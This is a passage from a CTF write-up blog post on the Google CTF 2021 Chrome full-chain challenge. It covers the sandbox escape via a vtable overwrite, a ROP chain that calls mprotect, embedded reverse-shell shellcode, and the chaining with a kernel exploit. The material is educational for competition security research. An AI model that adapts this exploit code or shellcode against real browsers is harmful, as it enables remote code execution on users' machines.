    <span class="k">await</span> <span class="nx">corrupt_ptr</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nx">restore</span><span class="p">,</span> <span class="nx">corrupt_idx</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nf">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">await</span> <span class="nx">corrupt_ptr</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">),</span> <span class="nx">corrupt_idx</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">rw_ptr</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">itof</span><span class="p">(</span><span class="nx">value</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">corrupt_ptr</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nx">restore</span><span class="p">,</span> <span class="nx">corrupt_idx</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>At this point, it is just a matter of overwriting the vtable to point to our fake vtable, and trigger one of the method in the fake vtable.</p><pre><code class="language-gdb">pwndbg&gt; tele 0x556bb2e51f90
00:0000│  0x556bb2e51f90 —▸ 0x556babcf6130 (content::CtfInterfaceImpl::~CtfInterfaceImpl()) ◂— push   rbp
01:0008│  0x556bb2e51f98 —▸ 0x556babcf6160 (content::CtfInterfaceImpl::~CtfInterfaceImpl()) ◂— push   rbp
02:0010│  0x556bb2e51fa0 —▸ 0x556babcf6290 ◂— push   rbp
03:0018│  0x556bb2e51fa8 —▸ 0x556babcf62f0 ◂— push   rbp
04:0020│  0x556bb2e51fb0 —▸ 0x556babcf6330 ◂— push   rbp
05:0028│  0x556bb2e51fb8 ◂— 0x0
</code></pre><p>As we can see here, we just need to fake one of these entries and call the method on <code class="language-plaintext highlighter-rouge">CtfInterface</code>. I chose to fake the <code class="language-plaintext highlighter-rouge">Read</code> method, which is at offset <code class="language-plaintext highlighter-rouge">0x18</code> of the vtable. To stablize the exploit, I only overwite the vtable of one victim object. It may have a lower chance of triggering but remember, we need to avoid crashing.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">ptr</span> <span class="k">of</span> <span class="nx">not_gc</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">ptr</span> <span class="o">==</span> <span class="nx">corrupt_ptr</span> <span class="o">||</span> <span class="nx">ptr</span> <span class="o">==</span> <span class="nx">rw_ptr</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">v</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">((</span><span class="k">await</span> <span class="nx">ptr</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="nx">i</span><span class="p">)).</span><span class="nx">value</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">v</span> <span class="o">==</span> <span class="nx">vtable_leak</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">cnt</span> <span class="o">++</span><span class="p">;</span>
            <span class="kd">let</span> <span class="nx">fake_vtable</span> <span class="o">=</span> <span class="nx">pivot_addr</span><span class="p">;</span>
            <span class="k">await</span> <span class="nx">ptr</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">itof</span><span class="p">(</span><span class="nx">fake_vtable</span><span class="p">),</span> <span class="nx">i</span><span class="p">);</span>

            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">cnt</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>At the <code class="language-plaintext highlighter-rouge">pivot_addr</code> address, I prepared the fake vtable as well as the ROP chain and shellcode. The ROP chain makes the data section chrome executable, and after that, I just jump to the shellcode below.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre><td class="rouge-code"><pre><span class="kd">let</span> <span class="nx">rop</span> <span class="o">=</span> <span class="p">[</span>
    <span class="nx">add_rsp_pop_rbp</span><span class="p">,</span>
    <span class="mh">0xdeadbeef</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0xdeadbeef</span><span class="nx">n</span><span class="p">,</span>
    <span class="nx">xchg_rax</span><span class="p">,</span>
    <span class="mh">0xdeadbeef</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0xdeadbeef</span><span class="nx">n</span><span class="p">,</span>
    <span class="c1">// mprotect rwx ROP chain</span>
    <span class="nx">pop_rax</span><span class="p">,</span>
    <span class="mi">10</span><span class="nx">n</span><span class="p">,</span>
    <span class="nx">pop_rdi</span><span class="p">,</span>
    <span class="nx">page_start</span><span class="p">,</span>
    <span class="nx">pop_rsi</span><span class="p">,</span>
    <span class="nx">page_len</span><span class="p">,</span>
    <span class="nx">pop_rdx</span><span class="p">,</span>
    <span class="mh">0x7</span><span class="nx">n</span><span class="p">,</span>
    <span class="nx">syscall</span><span class="p">,</span>
    <span class="nx">nop</span><span class="p">,</span>
    <span class="nx">pivot_addr</span> <span class="o">+</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">21</span><span class="p">),</span>
    <span class="nx">nop</span><span class="p">,</span>
    <span class="nx">nop</span><span class="p">,</span>
    <span class="nx">nop</span><span class="p">,</span>
    <span class="nx">nop</span><span class="p">,</span>
    <span class="c1">// 0xcccccccc_ccccccccn,</span>
    <span class="c1">// Reverse shell to localhost:1337</span>
    <span class="mh">0x16a5f026a58296a</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x48c58948050f995e</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x1010101010101b8</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x38040103b8485002</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x240431480301017e</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x106aef8948582a6a</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x36a050fe689485a</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x6a560b78ceff485e</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0xeb050fef89485821</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x69622fb848686aef</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x894850732f2f2f6e</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x34810101697268e7</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x56f6310101010124</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x4856e601485e086a</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0xf583b6ad231e689</span><span class="nx">n</span><span class="p">,</span>
    <span class="mh">0x9090909090909005</span><span class="nx">n</span>
<span class="p">];</span>

<span class="nf">arb_write_array</span><span class="p">(</span><span class="nx">pivot_addr</span><span class="p">,</span> <span class="nx">rop</span><span class="p">);</span>

<span class="c1">// Need to wait for write to populate</span>
<span class="nf">setTimeout</span><span class="p">(</span><span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">ptr</span> <span class="k">of</span> <span class="nx">not_gc</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">ptr</span> <span class="o">==</span> <span class="nx">corrupt_ptr</span> <span class="o">||</span> <span class="nx">ptr</span> <span class="o">==</span> <span class="nx">rw_ptr</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">await</span> <span class="nx">ptr</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
</pre></table></code></div></div><p>And here it is, the long waited shellcode execution…</p><p><img data-proofer-ignore data-src="/assets/img/fullchain/sbx.png" alt="sbx" /></p><h2 id="actually-getting-the-flag">Actually Getting The Flag</h2><p>Now that we’ve got both the renderer and sandbox escape exploit working, we need to chain them together and with the kernel exploit to get the flag. There are serveral things I needed to work on while doing this.</p><h3 id="41-chaining-the-renderer-and-sandbox-escape">4.1. Chaining The Renderer and Sandbox Escape</h3><p>Initially, I was spraying too much in the sandbox escape part, leading to garbage collection. This was not good, because the messed up Partition Alloc still exists in the renderer exploit. I needed to tweak the spray from both parts to a lower number of iterations to not encounter this problem.</p><p>Secondly, there are some wait duration I had to put in the exploit, because for some reason, the leak and overwrite were not populated right away.</p><h3 id="42-chaining-the-browser-and-the-kernel-exploit">4.2. Chaining The Browser and The Kernel Exploit</h3><p>This was definitely the fun part. We did not realized that there was no networking in the VM until later on, and so we cannot just redirect the browser exploit to a remote address. Instead, we need to send the whole exploit in HTML/JS. This also means that we can’t just pull the kernel exploit from remote, and we need to put it in the HTML too (probably, right?)</p><p>On another note, I tried connecting to the submission server and copy-paste the HTML/JS exploit. It worked for small files, but for the huge exploit, this did not work. Later, I figured out it was some buffering issue and wrote a submit script for it. Worked flawlessly :D</p><p>Now for the options of including the kernel exploit:</p><ul><li>We can write it in shellcode form<li>We can shove it right after the HTML file and execute shellcode to extract it, then run it.<li>We can also just put the source code after the HTML file and extract it, compile it, then run it :D</ul><p>To save time, I chose the 2nd method, after fighting with remote gcc lacking some stuff. And this did not disappoint us.</p><p><img data-proofer-ignore data-src="/assets/img/fullchain/fullchain.png" alt="fullchain" /></p><h2 id="conclusion">Conclusion</h2><p>This has definitely been a wild journey for me, because I have put off learning both PartitionAlloc and chrome sandbox escape for a while. There are several other ideas of solving the challenge I would like to note here:</p><ul><li>For the renderer exploit, one can control the inlined ArrayBuffer of a TypedArray if it is small enough. This is good enough to achieve arbitrary read/write. I did not know about this until I talked to my friend <a href="https://twitter.com/kaanezder">@kaanezder</a> and <a href="https://twitter.com/harsh_khuha">@harsh_khuha</a> after the CTF<li>For the sandbox escape, one can choose to rewrite the <code class="language-plaintext highlighter-rouge">CommandLine</code> data of chrome to disable the sandbox, and use the renderer exploit again. <a href="https://twitter.com/tjbecker_">@tjbecker_</a> from theori.io has an awesome blog post <sup id="fnref:5" role="doc-noteref"><a href="#fn:5" class="footnote" rel="footnote">5</a></sup> about this</ul><p>When writing the exploit, I’ve also made some shellcode generator from pwntools to JSArray.</p><p>You can find the full solution <a href="https://github.com/ducphanduyagentp/browser-pwn-advent-calendar/tree/main/05">here</a></p><p>Please feel free to find me and discuss on twitter <a href="https://twitter.com/flyingpassword">@flyingpassword</a>. I would really like to know how I can improve on the debugging as well as the exploitation.</p><p>Thank you for reading, and thank you Google CTF for an awesome challenge!</p><h2 id="footnote">Footnote</h2><div class="footnotes" role="doc-endnotes"><ol><li id="fn:1" role="doc-endnote"><p>https://dmxcsnsbh.github.io/2020/07/20/0CTF-TCTF-2020-Chromium-series-challenge/ <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:2" role="doc-endnote"><p>https://blog.perfect.blue/Chromium-Fullchain <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:3" role="doc-endnote"><p>https://mem2019.github.io/jekyll/update/2020/07/03/TCTF-Chromium-SBX.html <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:4" role="doc-endnote"><p>https://struct.github.io/partition_alloc.html <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:5" role="doc-endnote"><p>https://blog.theori.io/research/escaping-chrome-sandbox/ <a href="#fnref:5" class="reversefootnote" role="doc-backlink">&#8617;</a></p></ol></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/pwn/'>pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/browser/" class="post-tag no-text-decoration" >browser</a> <a href="/tags/v8/" class="post-tag no-text-decoration" >v8</a> <a href="/tags/mojo/" class="post-tag no-text-decoration" >mojo</a> <a href="/tags/chrome/" class="post-tag no-text-decoration" >chrome</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1"></span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Google CTF 2021 - Fullchain - ret2life&url=https://ret2.life/posts/Google-CTF-2021/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Google CTF 2021 - Fullchain - ret2life&u=https://ret2.life/posts/Google-CTF-2021/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Google CTF 2021 - Fullchain - ret2life&url=https://ret2.life/posts/Google-CTF-2021/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="" title-succeed=""> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Google-CTF-2021/">Google CTF 2021 - Fullchain</a><li><a href="/posts/CSAW-CTF-17-Qual/">CSAW CTF 2017 Qualification</a><li><a href="/posts/AceBear-CTF-19/">AceBear CTF 19</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/browser/">browser</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/radare2/">radare2</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/blue-team/">blue team</a> <a class="post-tag" href="/tags/ccdc/">ccdc</a> <a class="post-tag" href="/tags/chrome/">chrome</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/corCTF-2021/"><div class="card-body"> <span class="timeago small" >Aug 23, 2021<i class="unloaded">2021-08-23T11:47:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>corCTF 2021 - outfoxed</h3><div class="text-muted small"><p> 12 hours before the CTF ended, my friend hit me up telling me about the firefox pwn challenge in corCTF. I have never done Firefox/Spidermonkey pwn before, so this has been an awesome learning oppo...</p></div></div></a></div><div class="card"> <a href="/posts/GRIMM-HAX-Combined-Challenge/"><div class="card-body"> <span class="timeago small" >May 23, 2018<i class="unloaded">2018-05-23T03:08:38+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GRIMM HAX Combined Challenge</h3><div class="text-muted small"><p> This is the write-up for challenges I have done GRIMM HAX challenge. Welcome, Bobby (100pts) Accessing the website at http://www.haxcorp.grimm-co.com/, we are provided with a login page with us...</p></div></div></a></div><div class="card"> <a href="/posts/TetCTF-19/"><div class="card-body"> <span class="timeago small" >Jan 1, 2019<i class="unloaded">2019-01-01T14:34:45+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TetCTF 19</h3><div class="text-muted small"><p> This is my write-up for TetCTF 19 Web - IQTest2 (unsolved) Pwn - Easy webserver (unsolved) Pwn - Babysandbox Pwn - Babyheap Pwn - Babyfirst Web IQTest2 After looking at the s...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/AceBear-CTF-19/" class="btn btn-outline-primary" prompt="Older"><p>AceBear CTF 19</p></a> <a href="/posts/corCTF-2021/" class="btn btn-outline-primary" prompt="Newer"><p>corCTF 2021 - outfoxed</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Duc Phan</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4"></h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/browser/">browser</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/radare2/">radare2</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/blue-team/">blue team</a> <a class="post-tag" href="/tags/ccdc/">ccdc</a> <a class="post-tag" href="/tags/chrome/">chrome</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-WN0BSTHR4X"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-WN0BSTHR4X'); }); </script>
